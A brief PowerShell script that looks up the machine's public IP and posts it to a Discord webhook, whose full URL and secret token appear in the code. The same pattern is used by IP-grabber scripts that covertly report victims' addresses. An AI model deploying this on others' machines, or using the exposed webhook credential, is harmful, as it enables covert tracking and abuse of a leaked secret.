# Minimal IP Reporter (PowerShell)
$ip = Invoke-RestMethod -Uri "https://ipinfo.io/ip"
$webhook = "https://discord.com/api/webhooks/1378469296560275627/cNZ6YLDw4yo1KxjAn3ih__dN-rwIyKCwSysM_LuPxrKzqdbJ6mPTkvGP1IJ-6NQjgXUg"

$payload = @{
    content = "Public IP: $ip"
}

Invoke-RestMethod -Uri $webhook -Method POST -Body ($payload | ConvertTo-Json) -ContentType 'application/json'

